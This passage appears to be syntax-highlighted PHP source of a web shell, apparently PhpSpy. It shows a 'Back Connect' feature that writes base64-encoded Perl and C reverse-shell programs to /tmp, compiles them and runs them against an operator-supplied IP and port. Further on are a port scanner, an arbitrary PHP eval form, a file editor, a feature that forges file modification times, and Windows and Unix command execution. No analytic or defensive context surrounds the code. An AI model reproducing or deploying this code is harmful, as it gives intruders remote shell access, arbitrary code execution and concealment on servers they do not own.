</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $back_connect = &#34;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $back_connect_c = &#34;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp&#34; .
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &#34;Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($start &amp;&amp; $yourip &amp;&amp; $yourport &amp;&amp; $use) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($use == &#39;perl&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            cf(&#39;/tmp/angel_bc&#39;, $back_connect);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $res = execute(which(&#39;perl&#39;) . &#34; /tmp/angel_bc $yourip $yourport &amp;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            cf(&#39;/tmp/angel_bc.c&#39;, $back_connect_c);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $res = execute(&#39;gcc -o /tmp/angel_bc /tmp/angel_bc.c&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            @unlink(&#39;/tmp/angel_bc.c&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $res = execute(&#34;/tmp/angel_bc $yourip $yourport &amp;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        m(&#34;Now script try connect to $yourip port $yourport ...&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Back Connect&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;backconnect&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;Your IP:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;yourip&#39;, &#39;size&#39; =&gt; 20, &#39;value&#39; =&gt; $yourip));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;Your Port:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;yourport&#39;, &#39;size&#39; =&gt; 15, &#39;value&#39; =&gt; $yourport));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;Use:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeselect(array(&#39;name&#39; =&gt; &#39;use&#39;, &#39;option&#39; =&gt; $usedb, &#39;selected&#39; =&gt; $use));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;start&#39;, &#39;value&#39; =&gt; &#39;Start&#39;, &#39;type&#39; =&gt; &#39;submit&#39;, &#39;class&#39; =&gt; &#39;bt&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;portscan&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$scanip &amp;&amp; $scanip = &#39;127.0.0.1&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$scanport &amp;&amp; $scanport = &#39;21,25,80,110,135,139,445,1433,3306,3389,5631,43958&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Port Scan&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;portscan&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;IP:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;scanip&#39;, &#39;size&#39; =&gt; 20, &#39;value&#39; =&gt; $scanip));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;Port:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;scanport&#39;, &#39;size&#39; =&gt; 80, &#39;value&#39; =&gt; $scanport));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;startscan&#39;, &#39;value&#39; =&gt; &#39;Scan&#39;, &#39;type&#39; =&gt; &#39;submit&#39;, &#39;class&#39; =&gt; &#39;bt&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($startscan) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;h2&gt;Result »&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;ul class=&#34;info&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        foreach (explode(&#39;,&#39;, $scanport) as $port) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $fp = @fsockopen($scanip, $port, $errno, $errstr, 1);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if (!$fp) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;li&gt;&#39; . $scanip . &#39;:&#39; . $port . &#39; ------------------------ &lt;span style=&#34;font-weight:bold;color:#f00;&#34;&gt;Close&lt;/span&gt;&lt;/li&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;li&gt;&#39; . $scanip . &#39;:&#39; . $port . &#39; ------------------------ &lt;span style=&#34;font-weight:bold;color:#080;&#34;&gt;Open&lt;/span&gt;&lt;/li&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                @fclose($fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/ul&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } elseif ($action == &#39;eval&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $phpcode = trim($phpcode);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($phpcode) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (!preg_match(&#39;#&lt;\?#si&#39;, $phpcode)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $phpcode = &#34;&lt;?php\n\n{$phpcode}\n\n?&gt;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        eval(&#34;?&#34; . &#34;&gt;$phpcode&lt;?&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Eval PHP Code&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;eval&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    maketext(array(&#39;title&#39; =&gt; &#39;PHP Code&#39;, &#39;name&#39; =&gt; &#39;phpcode&#39;, &#39;value&#39; =&gt; $phpcode));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;p&gt;&lt;a href=&#34;http://w&#39; . &#39;ww.4ng&#39; . &#39;el.net/php&#39; . &#39;spy/pl&#39; . &#39;ugin/&#34; target=&#34;_blank&#34;&gt;Get plugins&lt;/a&gt;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfooter();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end eval
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;editfile&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (file_exists($opfile)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $fp = @fopen($opfile, &#39;r&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $contents = @fread($fp, filesize($opfile));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        @fclose($fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $contents = htmlspecialchars($contents);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Create / Edit File&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;file&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;title&#39; =&gt; &#39;Current File (import new file name and new file)&#39;, &#39;name&#39; =&gt; &#39;editfilename&#39;, &#39;value&#39; =&gt; $opfile, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    maketext(array(&#39;title&#39; =&gt; &#39;File Content&#39;, &#39;name&#39; =&gt; &#39;filecontent&#39;, &#39;value&#39; =&gt; $contents));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfooter();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    goback();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end editfile
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;newtime&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $opfilemtime = @filemtime($opfile);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    //$time = strtotime(&#34;$year-$month-$day $hour:$minute:$second&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $cachemonth = array(&#39;January&#39; =&gt; 1, &#39;February&#39; =&gt; 2, &#39;March&#39; =&gt; 3, &#39;April&#39; =&gt; 4, &#39;May&#39; =&gt; 5, &#39;June&#39; =&gt; 6, &#39;July&#39; =&gt; 7, &#39;August&#39; =&gt; 8, &#39;September&#39; =&gt; 9, &#39;October&#39; =&gt; 10, &#39;November&#39; =&gt; 11, &#39;December&#39; =&gt; 12);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Clone folder/file was last modified time&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;file&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;title&#39; =&gt; &#39;Alter folder/file&#39;, &#39;name&#39; =&gt; &#39;curfile&#39;, &#39;value&#39; =&gt; $opfile, &#39;size&#39; =&gt; 120, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;title&#39; =&gt; &#39;Reference folder/file (fullpath)&#39;, &#39;name&#39; =&gt; &#39;tarfile&#39;, &#39;size&#39; =&gt; 120, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfooter();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Set last modified&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;file&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;title&#39; =&gt; &#39;Current folder/file (fullpath)&#39;, &#39;name&#39; =&gt; &#39;curfile&#39;, &#39;value&#39; =&gt; $opfile, &#39;size&#39; =&gt; 120, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;p&gt;year:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;year&#39;, &#39;value&#39; =&gt; date(&#39;Y&#39;, $opfilemtime), &#39;size&#39; =&gt; 4));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;month:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;month&#39;, &#39;value&#39; =&gt; date(&#39;m&#39;, $opfilemtime), &#39;size&#39; =&gt; 2));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;day:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;day&#39;, &#39;value&#39; =&gt; date(&#39;d&#39;, $opfilemtime), &#39;size&#39; =&gt; 2));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;hour:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;hour&#39;, &#39;value&#39; =&gt; date(&#39;H&#39;, $opfilemtime), &#39;size&#39; =&gt; 2));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;minute:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;minute&#39;, &#39;value&#39; =&gt; date(&#39;i&#39;, $opfilemtime), &#39;size&#39; =&gt; 2));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;second:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;second&#39;, &#39;value&#39; =&gt; date(&#39;s&#39;, $opfilemtime), &#39;size&#39; =&gt; 2));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfooter();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    goback();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end newtime
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;shell&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (IS_WIN &amp;&amp; IS_COM) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($program &amp;&amp; $parameter) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $shell = new COM(&#39;Shell.Application&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $a = $shell-&gt;ShellExecute($program, $parameter);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Program run has &#39; . (!$a ? &#39;success&#39; : &#39;fail&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        !$program &amp;&amp; $program = &#39;c:\windows\system32\cmd.exe&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        !$parameter &amp;&amp; $parameter = &#39;/c net start &gt; &#39; . SA_ROOT . &#39;log.txt&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        formhead(array(&#39;title&#39; =&gt; &#39;Execute Program&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;action&#39;, &#39;shell&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;title&#39; =&gt; &#39;Program&#39;, &#39;name&#39; =&gt; &#39;program&#39;, &#39;value&#39; =&gt; $program, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;title&#39; =&gt; &#39;Parameter&#39;, &#39;name&#39; =&gt; &#39;parameter&#39;, &#39;value&#39; =&gt; $parameter));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeinput(array(&#39;name&#39; =&gt; &#39;submit&#39;, &#39;class&#39; =&gt; &#39;bt&#39;, &#39;type&#39; =&gt; &#39;submit&#39;, &#39;value&#39; =&gt; &#39;Execute&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Execute Command&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;shell&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (IS_WIN &amp;&amp; IS_COM) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $execfuncdb = array(&#39;phpfunc&#39; =&gt; &#39;phpfunc&#39;, &#39;wscript&#39; =&gt; &#39;wscript&#39;, &#39;proc_open&#39; =&gt; &#39;proc_open&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeselect(array(&#39;title&#39; =&gt; &#39;Use:&#39;, &#39;name&#39; =&gt; &#39;execfunc&#39;, &#39;option&#39; =&gt; $execfuncdb, &#39;selected&#39; =&gt; $execfunc, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;title&#39; =&gt; &#39;Command&#39;, &#39;name&#39; =&gt; &#39;command&#39;, &#39;value&#39; =&gt; htmlspecialchars($command)));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;submit&#39;, &#39;class&#39; =&gt; &#39;bt&#39;, &#39;type&#39; =&gt; &#39;submit&#39;, &#39;value&#39; =&gt; &#39;Execute&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($command) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;hr width=&#34;100%&#34; noshade /&gt;&lt;pre&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($execfunc == &#39;wscript&#39; &amp;&amp; IS_WIN &amp;&amp; IS_COM) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $wsh = new COM(&#39;WScript.shell&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $exec = $wsh-&gt;exec(&#39;cmd.exe /c &#39; . $command);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $stdout = $exec-&gt;StdOut();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $stroutput = $stdout-&gt;ReadAll();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            echo $stroutput;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } elseif ($execfunc == &#39;proc_open&#39; &amp;&amp; IS_WIN &amp;&amp; IS_COM) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $descriptorspec = array(
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                0 =&gt; array(&#39;pipe&#39;, &#39;r&#39;),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                1 =&gt; array(&#39;pipe&#39;, &#39;w&#39;),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                2 =&gt; array(&#39;pipe&#39;, &#39;w&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            );
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $process = proc_open($_SERVER[&#39;COMSPEC&#39;], $descriptorspec, $pipes);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if (is_resource($process)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fwrite($pipes[0], $command . &#34;\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fwrite($pipes[0], &#34;exit\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fclose($pipes[0]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                while (!feof($pipes[1])) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    echo fgets($pipes[1], 1024);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fclose($pipes[1]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                while (!feof($pipes[2])) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    echo fgets($pipes[2], 1024);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
